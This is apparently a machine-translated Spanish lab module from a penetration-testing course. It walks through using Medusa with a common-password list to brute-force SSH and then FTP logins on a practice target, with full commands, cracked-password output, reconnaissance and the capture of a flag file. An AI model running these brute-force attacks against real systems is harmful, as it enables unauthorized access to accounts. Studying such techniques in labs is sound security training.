# Servicios web

---

En el panorama dinámico de la ciberseguridad, el mantenimiento de mecanismos de autenticación robustos es primordial. Mientras que tecnologías como Secure Shell (`SSH`) y protocolo de transferencia de archivos (`FTP`) Facilitar el acceso remoto seguro y la gestión de archivos, a menudo dependen de las combinaciones tradicionales de nombre de usuario de nombre de usuario, presentando posibles vulnerabilidades explotables a través de ataques de fuerza bruta. En este módulo, profundizaremos en la aplicación práctica de`Medusa`, una potente herramienta de falsificación bruta, para comprometer sistemáticamente los servicios SSH y FTP, ilustrando así potenciales vectores de ataque y enfatizando la importancia de las prácticas de autenticación fortificadas.

`SSH`es un protocolo de red criptográfica que proporciona un canal seguro para el inicio de sesión remoto, la ejecución de comandos y las transferencias de archivos a través de una red no garantizada. Su fuerza radica en su cifrado, lo que lo hace significativamente más seguro que los protocolos no cifrados como`Telnet`. Sin embargo, las contraseñas débiles o fácilmente adivinables pueden socavar la seguridad de SSH, exponiéndola a ataques de fuerza bruta.

`FTP`es un protocolo de red estándar para transferir archivos entre un cliente y un servidor en una red de computadora. También se usa ampliamente para cargar y descargar archivos de los sitios web. Sin embargo, el FTP estándar transmite datos, incluidas las credenciales de inicio de sesión, en ClearText, lo que lo hace susceptible a la intercepción y el forzo bruto.

## Patada inicial

**Para seguir, inicie el sistema de destino a través de la sección de preguntas en la parte inferior de la página.**

Comenzamos nuestra exploración dirigida a un servidor SSH que se ejecuta en un sistema remoto. Asumiendo el conocimiento previo del nombre de usuario`sshuser`, podemos aprovechar Medusa para que intente diferentes combinaciones de contraseñas hasta que la autenticación exitosa se logre sistemáticamente.

The following command serves as our starting point:

  Servicios web

```shell-session
xnoxos@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

Desglosemos cada componente:

- `-h <IP>`: Especifica la dirección IP del sistema de destino.
- `-n <PORT>`: Define el puerto en el que escucha el servicio SSH (generalmente el puerto 22).
- `-u sshuser`: Establece el nombre de usuario para el ataque de fuerza bruta.
- `-P 2023-200_most_used_passwords.txt`: Punta Medusa a una lista de palabras que contiene las 200 contraseñas más utilizadas en 2023. La efectividad de un ataque de fuerza bruta a menudo está vinculada a la calidad y relevancia de la lista de palabras utilizada.
- `-M ssh`: Selecciona el módulo SSH dentro de Medusa, adaptando el ataque específicamente para la autenticación SSH.
- `-t 3`: Dicta el número de intentos de inicio de sesión paralelos para ejecutar simultáneamente. Aumentar este número puede acelerar el ataque, pero también puede aumentar la probabilidad de detección o desencadenar medidas de seguridad en el sistema objetivo.

  Servicios web

```shell-session
xnoxos@htb[/htb]$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
...
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

Tras la ejecución, Medusa mostrará su progreso a medida que se rinde en bicicleta a través de las combinaciones de contraseña. La salida indicará un inicio de sesión exitoso, revelando la contraseña correcta.

## Obtener acceso

Con la contraseña en la mano, establezca una conexión SSH usando el siguiente comando e ingrese la contraseña encontrada cuando se le solicite:

  Servicios web

```shell-session
xnoxos@htb[/htb]$ ssh sshuser@<IP> -p PORT
```

Este comando iniciará una sesión SSH interactiva, otorgándole acceso a la línea de comandos del sistema remoto.

### Expandiendo la superficie de ataque

Una vez dentro del sistema, el siguiente paso es identificar otras superficies de ataque potenciales. Usando`netstat`(Dentro de la sesión SSH) Para enumerar los puertos y los servicios de escucha, descubres un servicio que se ejecuta en el puerto 21.

  Servicios web

```shell-session
xnoxos@htb[/htb]$ netstat -tulpn | grep LISTEN

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
```

Más reconocimiento con`nmap`(Dentro de la sesión SSH) confirma este hallazgo como un servidor FTP.

  Servicios web

```shell-session
xnoxos@htb[/htb]$ nmap localhost

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000078s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

### Dirigirse al servidor FTP

Habiendo identificado el servidor FTP, puede proceder a la fuerza bruta de su mecanismo de autenticación.

Si exploramos el`/home`directorio en el sistema de destino, vemos un`ftpuser`carpeta, que implica la probabilidad de que el nombre de usuario del servidor FTP sea`ftpuser`. Según esto, podemos modificar nuestro comando Medusa en consecuencia:

  Servicios web

```shell-session
xnoxos@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

GENERAL: Parallel Hosts: 1 Parallel Logins: 5
GENERAL: Total Hosts: 1
GENERAL: Total Users: 1
GENERAL: Total Passwords: 197
...
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
...
GENERAL: Medusa has finished.
```

Las diferencias clave aquí son:

- `-h 127.0.0.1`: Se dirige al sistema local, ya que el servidor FTP se ejecuta localmente. El uso de la dirección IP le dice a Medusa explícitamente que use IPv4.
- `-u ftpuser`: Especifica el nombre de usuario`ftpuser`.
- `-M ftp`: Selecciona el módulo FTP dentro de Medusa.
- `-t 5`: Aumenta el número de intentos de inicio de sesión paralelos a 5.

### Recuperando la bandera

Al descifrar con éxito la contraseña FTP, establezca una conexión FTP. Dentro de la sesión FTP, use el`get`comandar para descargar el`flag.txt`archivo, que puede contener información confidencial.:

  Servicios web

```shell-session
xnoxos@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||25926|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||37251|)
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |***************************************************************************|    35      776.81 KiB/s    00:00 ETA
226 Transfer complete.
35 bytes received in 00:00 (131.45 KiB/s)
ftp> exit
221 Goodbye.
```

Luego lea el archivo para obtener la bandera:

  Servicios web

```shell-session
xnoxos@htb[/htb]$ cat flag.txt
HTB{...}
```

La facilidad con la que se pueden ejecutar tales ataques subrayan la importancia de emplear contraseñas fuertes y únicas.